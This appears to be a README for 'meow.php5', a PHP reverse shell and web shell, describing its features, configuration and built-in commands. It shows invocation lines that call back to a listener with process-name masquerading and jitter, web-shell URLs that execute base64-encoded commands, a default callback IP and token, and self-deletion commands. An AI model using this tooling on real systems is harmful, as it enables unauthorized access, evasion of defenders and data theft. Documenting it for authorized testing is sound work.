# Advanced Reverse Shell PHP

PHP Reverse Shell Security Research — Architecture, Features, Documentation, and Security Analysis.

## Repository status

This repository contains documentation and repository metadata for the **meow.php5** project — a single-file, zero-dependency, session-oriented PHP reverse shell and web shell.

**The PHP source file (`meow.php5`) is provided as-is and is not modified by this repository.** This repository adds documentation, a `.gitignore`, a `CHANGELOG`, and `CONTRIBUTING` guidance only.

## Overview

`meow.php5` is an interactive PHP reverse shell and web shell in a single file with no external dependencies. It is designed for authorized security research and penetration-testing use in isolated lab environments.

It provides:

- A CLI-driven reverse shell that calls home to a listener
- A web-shell mode usable over HTTP(S)
- An interactive command loop with built-in commands
- File transfer (`!download`, `!upload`, `!cat`, `!catb`)
- Optional interactive PTY upgrade (`!upgrade`)
- Transient TCP port forwarding (`!fwd`)
- Authentication via SHA-256 token hash (never plaintext on the wire)
- Optional TLS encryption
- Process-title masquerading and beacon jitter for blending in
- Side-effect tracking and cleanup (`!cleanup`, `!selfdestruct`)

## Features

| Category | Capability |
|----------|------------|
| **Shell access** | Interactive command loop; arbitrary command execution via available PHP primitives (`proc_open`, `shell_exec`, `passthru`, `system`, `exec`, `popen`) |
| **Web shell** | HTTP(S) request-driven command execution with configurable parameter names |
| **Authentication** | Token-based; SHA-256 hash transmitted, never the plaintext token |
| **Transport** | Plain TCP or optional TLS (self-signed accepted, peer verification disabled) |
| **Reconnection** | Exponential backoff reconnect with jitter; configurable max attempts |
| **File transfer** | `!download` (URL → host), `!upload` (base64 → host), `!cat` (text), `!catb` (base64, binary-safe) |
| **PTY** | Optional interactive pseudo-terminal upgrade (`!upgrade`) with graceful fallback |
| **Port forwarding** | Background TCP forwarder (`!fwd`), loopback-only by default, `--all` binds to `0.0.0.0` |
| **Blending in** | Process-title alias (`--alias`), beacon jitter (`--jitter`), suppressible warnings, renameable web parameters |
| **Recon** | `!info` (host + PHP report), `!perm` (exec primitives, `disable_functions`, `open_basedir`), `!env` |
| **PHP eval** | `!php <code>` — evaluate arbitrary PHP in the shell process |
| **Process management** | `!cd`, `!pwd`, `!ls`, wall-clock command timeout |
| **Cleanup** | `!cleanup [--self]` reverts tracked file writes and kills tracked forwarders; `!selfdestruct` deletes the shell file |
| **Include-safe** | No side effects when `include`d; opt-in trigger (`MEOW_RUN_ON_INCLUDE` or `?sid=upd`) |

## Architecture

The file is organized into functional sections:

- **Config** — default values, CLI argument parsing, environment variable overrides (`MEOW_*`)
- **Low-level utilities** — output, UTF-8 normalization, OS detection, HTTP vs CLI detection, constant-time token comparison
- **Working directory** — cwd tracking
- **Capabilities** — detection of available command-execution primitives
- **Command execution** — `meow_raw_exec` / `meow_exec` with wall-clock timeout via the `timeout` binary
- **Prompt / banner** — host/user identification, ANSI-colored prompt, version banner
- **Recon** — `!info` and `!perm` reports
- **Fetch** — `!download` implementation (URL fopen, cURL, curl/wget binaries)
- **PTY** — PTY session (`script`, python pty, or plain shell fallback)
- **Port forwarding** — forked detached TCP relay (`pcntl_fork`)
- **Built-ins** — all `!` commands (`!help`, `!info`, `!perm`, `!cd`, `!pwd`, `!ls`, `!cat`, `!catb`, `!download`, `!upload`, `!fwd`, `!env`, `!php`, `!cleanup`, `!selfdestruct`, `!exit`, `!upgrade`)
- **Session loops** — simple line-at-a-time session; PTY session for byte-for-byte forwarding
- **Blending in** — process-title aliasing, jitter, side-effect ledger
- **Transport** — TCP/TLS connection, SHA-256 handshake
- **Web shell mode** — HTTP request handling, token check, base64 command channel
- **Entry** — config initialization, include-safety guard, dispatch to web or reverse mode

See `docs/ARCHITECTURE.md` for details.

## Requirements

- **PHP** — tested with PHP 5.x and 7.x-compatible code paths (see notes below). The source uses features present in PHP 5.4+ (e.g., `short_array_tag` is not used; arrays use `array()` style in places but also `[]` in some spots — verify against your target).
- No external PHP extensions are strictly required; the shell degrades gracefully when optional extensions (pcntl, posix, curl, mbstring) are absent.
- For the PTY upgrade: `script`, `python3`, or `python` on the target host.
- For port forwarding: `pcntl` extension (specifically `pcntl_fork`).
- For command timeouts: the `timeout` binary on PATH.
- A listener on the attacker/researcher side (e.g., `nc`, `socat`, or any TCP listener capable of speaking the session protocol).

### PHP compatibility

The source declares `version => '2.1'`. The code avoids PHP 8-only syntax and is written to run on PHP 5.x/7.x where possible, with graceful degradation for missing functions. No formal compatibility matrix has been verified; test against your target PHP version in an isolated lab.

## Installation

No build step or installation is required. The project is a single PHP file:

1. Copy `meow.php5` to the target host (only in an authorized, isolated lab environment).
2. Configure the listener host/port and token (see Configuration below).
3. Start a listener on your machine.
4. Run: `php meow.php5 [host] [port] [token] [options]`

**Do not deploy this to any system you do not own or have explicit written authorization to test.**

## Configuration reference

All settings live in the `$GLOBALS['meow']` config array at the end of `meow.php5`. Each setting can be overridden three ways, in increasing precedence:

1. Default value in the config array
2. CLI argument (positional host/port/token or flags)
3. Environment variable `MEOW_<UPPERCASE_KEY>`

### Default configuration values

| Key | Default | CLI flag | Env var | Description |
|-----|---------|----------|---------|-------------|
| `host` | `192.168.173.57` | positional arg 1 | `MEOW_HOST` | Callback target host |
| `port` | `6665` | positional arg 2 | `MEOW_PORT` | Callback target port |
| `token` | `X82Wd3t0qasJ87D9hUqPXCl5` | positional arg 3 | `MEOW_TOKEN` | Session auth token |
| `tls` | `false` | `--tls` / `--no-tls` | `MEOW_TLS` | Enable TLS |
| `retry` | `true` | `--no-retry` | `MEOW_RETRY` | Reconnect on disconnect |
| `retry_max` | `0` (forever) | — | `MEOW_RETRY_MAX` | Max reconnect attempts (0 = unlimited) |
| `retry_delay` | `5` | `--delay=<secs>` | `MEOW_RETRY_DELAY` | Base reconnect delay (seconds) |
| `exec_timeout` | `30` | `--timeout=<secs>` | `MEOW_EXEC_TIMEOUT` | Wall-clock cap per command; 0 disables |
| `pty` | `true` | `--no-pty` | `MEOW_PTY` | Offer PTY upgrade |
| `quiet` | `false` | `--quiet` | `MEOW_QUIET` | Suppress the no-token warning |
| `web` | `true` | — | `MEOW_WEB` | Enable web-shell mode |
| `web_key` | `sid` | — | `MEOW_WEB_KEY` | Request param carrying the token |
| `web_cmd` | `c` | — | `MEOW_WEB_CMD` | Request param carrying a raw command |
| `web_b64` | `upd` | — | `MEOW_WEB_B64` | Request param carrying a base64 command |
| `run_key` | `sid` | — | — | Include trigger key |
| `run_val` | `upd` | — | `MEOW_RUN_ON_INCLUDE` | Include trigger value / env opt-in |
| `proc_alias` | `''` | `--alias=<name>` | `MEOW_PROC_ALIAS` | Process title (e.g., `nginx`) |
| `jitter` | `0` | `--jitter=<0..1>` | `MEOW_JITTER` | Beacon jitter fraction |
| `version` | `2.1` | — | — | Reported version |

> **Note:** In the source, `web_key` is initially `'k'` then overridden to `'sid'`, and `web_b64` is initially `'cb'` then overridden to `'upd'`. The final effective defaults are `web_key => 'sid'` and `web_b64 => 'upd'`. `run_key` and `web_key` both default to `'sid'`; `run_val` and `web_b64` both default to `'upd'`.

### CLI arguments

```
php meow.php5 [host] [port] [token] \
    [--tls|--no-tls] [--no-retry] [--no-pty] [--quiet] \
    [--timeout=<secs>] [--delay=<secs>] \
    [--alias=<name>] [--jitter=<0..1>]
```

Positional arguments (host, port, token) must appear before any flag that starts with `-`, otherwise a flag could be mistaken for the token.

Environment override example:
```
MEOW_HOST=1.2.3.4 MEOW_PORT=443 MEOW_TOKEN=... php meow.php5 --tls --alias=nginx --jitter=0.6
```

## Web shell usage

When accessed over HTTP (non-CLI SAPI), the file acts as a web shell if the `web` config is enabled:

- `https://host/meow.php5?sid=<token>` — returns `ok` (auth check only)
- `https://host/meow.php5?sid=<token>&upd=<base64cmd>` — executes the base64-decoded command
- `POST` with body parameter `upd=<base64cmd>` also works (preferred; avoids query-string mangling)
- Raw command via `c` parameter: `?sid=<token>&c=<command>` (not base64-encoded)

When `include`d by another script, no side effects occur unless the include trigger is present:
- `?sid=upd` (where `sid` = `run_key` and `upd` = `run_val`), or
- `MEOW_RUN_ON_INCLUDE=1` environment variable

## Available commands

Any line not starting with `!` is executed in the shell (verbatim, via `sh -c`), so pipes, redirection, quoting, and job control work normally. `!!<cmd>` escapes a leading `!` so it reaches the shell as a literal command name.

| Command | Syntax | Behavior |
|---------|--------|----------|
| `!help` | `!help` | List built-in commands |
| `!info` | `!info` | Host + PHP capability report |
| `!perm` | `!perm` | Exec primitives, `disable_functions`, `open_basedir` |
| `!cd` | `!cd <dir>` | Change working directory (no args resets to default) |
| `!pwd` | `!pwd` | Print working directory |
| `!ls` | `!ls [dir]` | Long listing of a directory |
| `!cat` | `!cat <file>` | Print a text file (>1 MiB suggests `!catb`) |
| `!catb` | `!catb <file>` | Print a file as base64 (binary-safe; >10 MiB suggests `!download`) |
| `!download` | `!download <url> [path]` | Pull a remote file onto this host |
| `!upload` | `!upload <path>` | Send base64 on following lines, `.` to finish (50 MiB ceiling) |
| `!upgrade` | `!upgrade` | Swap to an interactive PTY |
| `!fwd` | `!fwd [--all] <lport> <rhost> <rport>` | Background TCP forwarder (loopback-only unless `--all`) |
| `!env` | `!env` | Dump environment variables |
| `!php` | `!php <code>` | Evaluate PHP in this process |
| `!cleanup` | `!cleanup [--self]` | Revert tracked writes, stop tracked forwards, reset cwd; `--self` also deletes the shell |
| `!selfdestruct` | `!selfdestruct` | Delete the shell file and exit |
| `!exit` | `!exit` | Close the session |

See `docs/COMMANDS.md` for full details on each command.

## Version differences

The source declares `version => '2.1'`. See `CHANGELOG.md` for the documented differences between versions. No earlier versions are present in this repository; only the v2.1 source is included.

## Security warnings

⚠️ **This is an offensive-security tool.** It provides remote command execution, file read/write, PHP evaluation, port forwarding, and self-deletion. It is intended exclusively for authorized security research and penetration testing in isolated lab environments.

- **Authentication is weak by design:** the token is a single shared secret. Anyone who can reach the callback host:port can attempt to drive the shell. Always set a strong `MEOW_TOKEN`.
- **TLS does not verify the peer:** `verify_peer` is disabled and self-signed certificates are accepted. TLS protects against passive eavesdropping but not active MITM.
- **Command execution is unrestricted:** `!php`, `!download`, `!upload`, and arbitrary shell commands run with the privileges of the PHP process.
- **`disable_functions` may block execution primitives:** if all primitives are disabled, the shell cannot run commands.
- **Process-title aliasing and jitter are tradecraft, not stealth guarantees:** they make the shell harder to find by casual inspection, not undetectable.

See `docs/SECURITY.md` for a full security analysis.

## Known limitations

- Single file, single session at a time (the reverse mode is blocking).
- TLS peer verification is intentionally disabled (self-signed accepted).
- Port forwarding requires `pcntl_fork` and forks a detached child per forwarder.
- PTY upgrade is unavailable on Windows.
- Command execution depends on at least one of `proc_open`, `shell_exec`, `passthru`, `system`, `exec`, or `popen` not being disabled.
- The `!cat` text path refuses files >1 MiB; `!catb` refuses >10 MiB; `!upload` caps at 50 MiB.
- Web mode reads `$_SERVER` and `$_ENV` — environment exposure depends on SAPI configuration.
- No source-code obfuscation, packing, or polymorphism.
- No formal PHP compatibility matrix verified.

## Testing information

No automated test suite is included in this repository. The project has not been executed as part of this documentation effort (the reverse shell must not be run except in an authorized, isolated lab). Any claims about test results would be fabricated and are intentionally absent.

Behavior described in this documentation is inferred by reading the source code, not by execution.

## Responsible-use statement

This tool is for **authorized security research and penetration testing only**. Use it only:

- On systems you own, or
- On systems for which you have explicit, written authorization to test, and
- In an isolated lab environment.

Unauthorized deployment, use on systems you do not own, or any use that facilitates unauthorized access is prohibited. The maintainer does not condone or facilitate misuse.

## License

Based on pentestmonkey's php-reverse-shell (GPLv2), rewritten as a session-oriented shell. Review the source header and any accompanying license terms before use.
